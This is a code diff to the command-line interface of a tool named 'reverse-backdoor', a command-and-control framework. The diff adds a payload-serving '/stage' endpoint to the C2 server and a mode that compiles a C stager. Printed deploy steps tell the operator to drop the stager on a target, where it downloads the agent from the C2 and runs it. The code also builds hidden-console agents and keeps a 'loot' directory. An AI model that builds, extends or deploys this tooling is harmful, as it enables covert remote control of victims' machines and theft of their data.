@@ -38,7 +38,9 @@ def cli(ctx):
               help='Enable TLS transport encryption')
 @click.option('--http/--no-http', default=False, envvar='REVERSE_BACKDOOR_HTTP',
               help='Use HTTP beacon instead of TCP')
-def server(host, port, loot, encryption, tls, http):
+@click.option('--stage', default=None,
+              help='Payload file to serve at GET /stage (for C stager)')
+def server(host, port, loot, encryption, tls, http, stage):
     """Start the C2 listener and interactive manager."""
     if http:
         from server.server import _run_http
@@ -46,7 +48,10 @@ def server(host, port, loot, encryption, tls, http):
         os.environ['REVERSE_BACKDOOR_BIND_PORT'] = str(port)
         os.environ['REVERSE_BACKDOOR_LOOT_DIR'] = loot
         os.environ['REVERSE_BACKDOOR_TLS'] = str(tls).lower()
-        _run_http({'bind_host': host, 'bind_port': port, 'loot_dir': loot, 'tls': tls, 'http_mode': True})
+        config = {'bind_host': host, 'bind_port': port, 'loot_dir': loot, 'tls': tls, 'http_mode': True}
+        if stage:
+            config['stage_payload'] = stage
+        _run_http(config)
         return
     """Start the C2 listener and interactive manager."""
     click.secho('[+] Starting reverse-backdoor C2 server', fg='green', bold=True)
@@ -121,13 +126,19 @@ def client(host, port, reconnect, encryption, tls, http, front_host):
 @click.option('--host', required=True, help='C2 server IP/hostname')
 @click.option('--port', default=5555, type=int, help='C2 server port')
 @click.option('--output', '-o', default=None,
-              help='Output filename (default: agent.exe / agent.elf)')
-@click.option('--encryption/--no-encryption', default=False,
-              help='Enable ECDH+AES-256-GCM encryption')
-@click.option('--reconnect', default=5, type=int,
-              help='Reconnect interval (default: 5s)')
-def generate(target_os, host, port, output, encryption, reconnect):
-    """Generate a standalone agent payload for the specified OS."""
+              help='Output filename')
+@click.option('--encryption/--no-encryption', default=False)
+@click.option('--reconnect', default=5, type=int)
+@click.option('--staged/--no-staged', default=False,
+              help='Generate C stager that downloads payload from C2')
+@click.option('--http/--no-http', default=False,
+              help='Use HTTP for stager stage download')
+def generate(target_os, host, port, output, encryption, reconnect, staged, http):
+    """Generate standalone agent payload or C stager."""
+    if staged:
+        _generate_stager(target_os, host, port, output, http)
+        return
+
     ext = '.exe' if target_os == 'windows' else '.elf' if target_os == 'linux' else ''
     output_path = output or f'agent_{target_os}{ext}'
 
@@ -144,16 +155,61 @@ REVERSE_BACKDOOR_ENCRYPTION={'true' if encryption else 'false'}
     click.secho(f'[+] Generated .env config for {target_os}', fg='green')
     click.secho(f'    Host: {host}:{port}', fg='cyan')
     click.secho(f'    Reconnect: {reconnect}s', fg='cyan')
-
     click.echo()
-    click.secho('[>] To compile on the target machine:', fg='yellow', bold=True)
+    click.secho('[>] To compile:', fg='yellow', bold=True)
     click.echo('  pip install pyinstaller')
     if target_os == 'windows':
-        click.echo(f'  pyinstaller --onefile --noconsole client/client.py --name agent_{target_os}')
+        click.echo(f'  pyinstaller --onefile --noconsole client/client.py')
     else:
-        click.echo(f'  pyinstaller --onefile client/client.py --name agent_{target_os}')
+        click.echo(f'  pyinstaller --onefile client/client.py')
+
+
+def _generate_stager(target_os, host, port, output, http):
+    import subprocess
+    import shutil
+
+    stage_port = port
+    stage_host = host
+
+    make_cmd = f'stager-{"windows" if target_os == "windows" else "linux"}'
+    makefile_dir = os.path.join(os.path.dirname(__file__), 'c-implant')
+    gcc = shutil.which('x86_64-w64-mingw32-gcc') if target_os == 'windows' else shutil.which('gcc')
+
+    if not gcc:
+        click.secho(f'[-] {"MinGW" if target_os == "windows" else "GCC"} not found.', 'red')
+        click.secho(f'    Install: apt install {"mingw-w64" if target_os == "windows" else "gcc"}', 'yellow')
+        return
+
+    click.secho(f'[+] Building {target_os} stager...', fg='green')
+    click.secho(f'    Stage URL: {"http" if not http else "https"}://{stage_host}:{stage_port}/stage', fg='cyan')
+
+    env = os.environ.copy()
+    env['STAGE_HOST'] = stage_host
+    env['STAGE_PORT'] = str(stage_port)
+
+    result = subprocess.run(
+        ['make', make_cmd],
+        cwd=makefile_dir,
+        env=env,
+        capture_output=True, text=True,
+    )
+
+    if result.returncode != 0:
+        click.secho(f'[-] Build failed:\n{result.stderr}', 'red')
+        return
+
+    built_file = os.path.join(makefile_dir, 'stager.exe' if target_os == 'windows' else 'stager_linux')
+    out = output or (f'stager_{target_os}.exe' if target_os == 'windows' else f'stager_{target_os}')
+    shutil.copy(built_file, out)
+    size = os.path.getsize(out)
+
+    click.secho(f'[+] Stager built: {out} ({size:,} bytes)', fg='green', bold=True)
     click.echo()
-    click.secho(f'  Output: dist/agent_{target_os}{ext}', fg='green')
+    click.secho('[>] Deploy:', fg='yellow')
+    click.echo(f'  1. Compile Python agent:   pyinstaller --onefile client/client.py')
+    click.echo(f'  2. Start C2 with payload:  python3 cli.py server --http --stage dist/client')
+    click.echo(f'  3. Drop stager on target:  {out}')
+    click.echo(f'  4. Stager downloads agent from C2 and executes')
 
 
 if __name__ == '__main__':
